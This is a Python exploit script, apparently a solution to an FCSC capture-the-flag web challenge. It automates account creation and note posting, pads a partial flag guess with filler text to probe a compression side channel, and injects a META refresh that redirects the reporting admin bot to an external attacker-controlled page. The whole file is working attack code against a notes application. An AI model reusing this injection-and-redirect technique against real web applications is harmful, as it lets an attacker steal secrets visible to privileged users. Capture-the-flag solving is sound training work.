import requests
from bs4 import BeautifulSoup

url_base = "http://challenges2.france-cybersecurity-challenge.fr:5006/"
url_login = url_base + "login"
url_save = url_base + "save"
url_delete = url_base + "delete"
url_report = url_base + "report"
url_notes = url_base + "notes"
url_shared = url_base + "shared"

garbage3 = "YGSXxF|TpOomXIC)knK|urJiugOhUALk-p|Xvm?#FBVsB/C/ipgE*i|_?oUQv.(EgWi|guE(jqTFm/Y#HDOnAGH|!umtO?ESF?O?K?gVw/~*WjMztQT%gA_S-~EQMUM$M(%yzUv$PLxgLAg-jBMZ~TA*m#Ct$px#CgA$kFGwo))?xxO%DQEJM|HrA!LBk||/)R_xBCqSYKWklBwnH%!NL-jogxMGNu$R)B)kukvvihXqNHzzqhXplXz)I#tHsu$sIlP_%E(Z#O/Q$-(WZ$NMEjtlzm/~%jyAU#HmIEo?ss*.YTYnyvwoRs-CLEB)RmILUPZEFV*(MjW|gEVx#tMNqvws_YBPEV-JUz/qvwBVTt_Ok-WTIJhrXVnIp~X%UO_z*DTxo_FSipJiK?QZ?)D~CtXAWu?GlZY_sOPs%rgkKtu(%Qx$MXWnZlp!T/H!prrZx/*YOvAtn.$RpO)PqLWuynVU#R(DBAtx?YEM)NqETkU*|*(Yt#|rx(q(|y*|~tpB.gksj/LzD?E#UPP%u?STuxEirVVN|IA#A-CwsjYKqVXnFQBiH!NrP!?ruL!JGOni-nQjrBPvpFoRoA/C*O%.LC$.zG#yILE/UBHoFpNOrVDtMnvjpA).)_g)W/BQqRgIDUJ!nmtN/yQQP.M#ohxP?FlEL!*g-ySj(z~hKtJF.Cu)QKui$ZMguOqL%-gDoJLlwQ*!pNjKTrXP_Gv$#?trgYV)*#G$HvR.XY(/r_Yg|j#Kosq-/WjTvjzz*SgZpEI?t(rhX(Qgg?kPSyrsCWtJO)ry_Pm/WsusmH.Cngg/KE%o$LIJ%w(GsN|VH~ixOVvNpuH(_lygqCkupz/t)tBADSm)EI(vXMLp)-?CzDGz#*QFOYVzI?j_.BghQKyUPwWB)StrZ.ggjps$r!yQRUgp~BZiX/.iVtLLP!ipm/kOWHskMBMZSXpmLBH)QGRiNzn)T?yt|g(uNMXToO|wp($O?|xKySpzkHG*L*ih_L#/?j-B?~Mu_DO$jPuWhHWivigVCSK~Mut!MBVY?MQ%r-p(CV|KtTJ%%GzLXK%Ps-YZZLDsRH_Rz)gOS?w-%I)B#RIUmmpQLy)(GG|Ih#|QWlJOHvjD#hv)CMOBw(nk_-pVR?hJuEAF.%nBHPW.!HS*U.!$DE)TS/jilFBG/nhNpoxH%jPogDlrF_.DQ|UGtC(tSxIrozrmRLwE?JmiSQVR/~zg?|m.-ISj(kWlBCVWWsslS?M#~x.vBqR)nWKOn._kitH!BZjTDGtojQMDXXD$.!)wu)k?T.)C$YmsyW~%ZA?PkShHpXtZFZLVUC|I!BqmRHCjVyPVqqU|r.ZStw!iZEQ-Yh.JxEhvPkUN.!x$MYSA!*uYlG)-?OD-KkNPnitgVCIxtPCB|VzIGrRTF|*-U%SjS)--S#Z-A*lnN(H-Ds/KEKvPVgsmCoZQ)DXFQpQGVp__EqiwPvKl//VpQO-RtpSQYINDgGlqlOslTwmws!)(Jv-N-UO$u~.B_LFU)rpjILwTlVgLPDKRqltl|WnRP?PnuhM~tlxHL)JhlIu~oj%IQlk#o?Ts~K_$_FWxGDDFzz-mJ)mr/zkCZGtmoO?BmT|L~qmRj_Th.?NGuLXY/A%?AAH|X#HTZjWJoXX!u!impjDiuqtOC(l--mLiHjK.sgVIHXHOzIqolvYRtyyxswRjW)Qk~CIYPF?~rxvDLN-qxFM|l)_s*~KFi_)vqrOEOSmjm(?nXyPm?HULi#Y.W?.gAUm**FoEtGA?yps!)jlZhrKG_KuIM?HzgI/kt(YUA/?otATuvim!npW#CB.AvQhBr|MUW#LCOSZZytm.Z)X)ogM~CuFD*mxXRQoUQYyRRq)-HBqktHhtuO~ALAEG#gsNtGKk/XRV$NPPhD*Fo#|EOzBNXjKViz.Ys%H/VH$!vxH/KZL(ul.~ZJsRiBR.QsjmOsuhNIUXT?!K_yDpoQ)|?)gHUR|.X_tm%ssqVvnOBR?lgAzoq~~yMpRik#H*"

def create_user(s, username):
    s.post(url_login, data={"username":username,"password":""})
    return s.cookies["uid"]

def share(s, user, shared):
    r = requests.post(url_shared, cookies={"uid":user}, data={"otherID":shared,"password":""})

def create_post(s, user, title="", content=""):
    r = requests.post(url_save, cookies={"uid":user}, data={"title":title,"content":content})

def report_post(s, user, post):
    r = requests.get(url_report  + "/" + post, cookies={"uid":user})

def delete_post(s, user, post):
    r = requests.get(url_delete  + "/" + post, cookies={"uid":user})

def delete_posts(s, user):
    posts = get_id_posts(s, user)
    print(f"Delete {len(posts)} posts")
    for id in posts:
        delete_post(s, user, id)

def get_id_posts(s, user):
    data = requests.get(url_notes, cookies={"uid":user}).text
    soup = BeautifulSoup(data, features="lxml")
    href = soup.find_all("a", attrs={"class":"close"})
    ids = []
    for a in href:
        if a["href"].startswith("/delete/"):
            ids.append(a["href"].split("/")[-1])
    return ids

if __name__ == "__main__":
    s = requests.session()
    prep = "FCSC{2172bd19c0}"#"FCSC{2172bd19c0}" # Replace with the part to guess
    dspiricate_brute = create_user(s, "dspiricate_brute_0")
    print("dspiricate_brute: ", dspiricate_brute)
    delete_posts(s, dspiricate_brute)
    create_post(s, dspiricate_brute, content=prep + garbage3[:-803]) # Add or remove garbage to find the perfect garbage length
    dspiricate_report = create_user(s, "dspiricate_report")
    print("dspiricate_report: ", dspiricate_report)
    delete_posts(s, dspiricate_report)
    create_post(s, dspiricate_report, content='<META http-equiv="refresh" content="0; URL=http://dspiricate.fr/compress.html">')
    to_report = get_id_posts(s, dspiricate_report)[0]
    report_post(s, dspiricate_report, to_report)
    print("reported post ", to_report)